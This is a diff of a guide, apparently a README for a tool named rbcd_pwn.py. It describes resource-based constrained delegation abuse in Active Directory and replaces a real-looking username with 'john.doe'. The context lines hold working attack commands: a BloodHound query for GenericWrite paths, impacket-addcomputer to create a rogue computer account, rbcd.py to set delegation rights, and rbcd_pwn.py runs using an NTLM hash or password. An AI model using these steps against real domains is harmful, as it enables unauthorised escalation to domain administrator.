@@ -83,7 +83,7 @@ The first step is to find which computer objects your compromised account has `G
 
 ```cypher
 MATCH p=shortestPath(
-  (u:User {name:"BURAK.DIRLIK@DOMAIN.LOCAL"})-[:GenericWrite|GenericAll*1..]->(c:Computer)
+  (u:User {name:"JOHN.DOE@DOMAIN.LOCAL"})-[:GenericWrite|GenericAll*1..]->(c:Computer)
 ) RETURN p
 ```
 
@@ -101,7 +101,7 @@ MATCH p=shortestPath(
 The foundation of this attack is adding a rogue computer account to the domain. This account will later be granted delegation rights and will request a service ticket on behalf of Administrator.
 
 ```bash
-impacket-addcomputer 'domain.local/burak.dirlik' \
+impacket-addcomputer 'domain.local/john.doe' \
   -dc-ip 10.10.10.10 \
   -hashes :NTLM_HASH \
   -computer-name 'DORK$' \
@@ -128,7 +128,7 @@ Now modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the targe
 python3 rbcd.py -f 'DORK' \
   -t 'TARGET_COMPUTER' \
   -dc-ip 10.10.10.10 \
-  'domain.local/burak.dirlik' \
+  'domain.local/john.doe' \
   -hashes :NTLM_HASH
 ```
 
@@ -212,13 +212,13 @@ Everything else is handled automatically:
 **With an NTLM hash:**
 
 ```bash
-python3 rbcd_pwn.py -dc-ip 10.10.10.10 -u burak.dirlik -c aabbccdd...NTLMHASH
+python3 rbcd_pwn.py -dc-ip 10.10.10.10 -u john.doe -c aabbccdd...NTLMHASH
 ```
 
 **With a plaintext password:**
 
 ```bash
-python3 rbcd_pwn.py -dc-ip 10.10.10.10 -u burak.dirlik -c 'P@ssw0rd!'
+python3 rbcd_pwn.py -dc-ip 10.10.10.10 -u john.doe -c 'P@ssw0rd!'
 ```
 
 ### Attack Flow Diagram
